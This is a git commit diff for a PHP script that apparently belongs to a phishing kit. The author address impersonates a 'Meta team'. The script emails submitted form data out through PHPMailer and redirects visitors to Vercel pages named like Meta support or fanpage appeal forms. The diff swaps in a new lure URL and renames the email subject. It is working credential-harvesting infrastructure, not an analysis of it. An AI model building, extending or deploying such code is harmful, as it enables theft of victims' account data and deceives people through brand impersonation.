fd393569fd97c0079bebe6889f60eb3c72fa7540
officialmetateamverified <official.meta.team.verified.here@gmail.com>
2025-08-02 18:33:04 +0800

    Update and rename rashid.php to md.php

--- md.php
+++ md.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://apply-here-support-request-form-ser.vercel.app/");
+header("Location: https://apply-support-team-form-fanpage-ser.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'RASHID';
+        $mail->Subject = 'MD';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
